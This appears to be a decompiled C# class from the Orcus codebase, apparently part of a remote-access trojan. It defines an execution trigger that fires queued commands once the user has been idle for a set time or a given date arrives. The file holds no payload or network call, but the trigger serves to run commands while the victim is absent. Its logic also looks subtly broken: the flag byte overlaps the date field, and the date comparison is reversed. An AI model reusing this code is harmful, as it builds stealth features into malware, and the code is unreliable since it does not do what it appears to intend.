using System;
using System.Runtime.InteropServices;
using System.Timers;
using Orcus.Native;
using Orcus.Shared.DynamicCommands.ExecutionEvents;

namespace Orcus.StaticCommandManagement.ExecutionEvents;

public class IdleExecutionEvent : IExecutionEvent
{
	private int _requiredIdleTime;

	private bool _executeAtDateTime;

	private DateTime _dateTime;

	private Timer _waiter;

	public bool CanExecute
	{
		get
		{
			LASTINPUTINFO plii = default(LASTINPUTINFO);
			plii.cbSize = (uint)Marshal.SizeOf((object)plii);
			if (NativeMethods.GetLastInputInfo(ref plii) && (uint)(Environment.TickCount - (int)plii.dwTime) > _requiredIdleTime * 1000)
			{
				return true;
			}
			if (_executeAtDateTime)
			{
				return _dateTime >= DateTime.UtcNow;
			}
			return false;
		}
	}

	public uint Id { get; } = 2u;


	public event EventHandler TheTimeHasCome;

	public void Initialize(byte[] parameter)
	{
		_requiredIdleTime = BitConverter.ToInt32(parameter, 0);
		_executeAtDateTime = parameter[5] == 1;
		_dateTime = DateTime.FromBinary(BitConverter.ToInt64(parameter, 5));
		if (!CanExecute)
		{
			_waiter = new Timer();
			_waiter.Elapsed += WaiterOnElapsed;
			_waiter.Interval = 30000.0;
			_waiter.Start();
		}
	}

	private void WaiterOnElapsed(object sender, ElapsedEventArgs e)
	{
		if (CanExecute)
		{
			this.TheTimeHasCome?.Invoke(this, EventArgs.Empty);
			_waiter.Dispose();
		}
	}
}
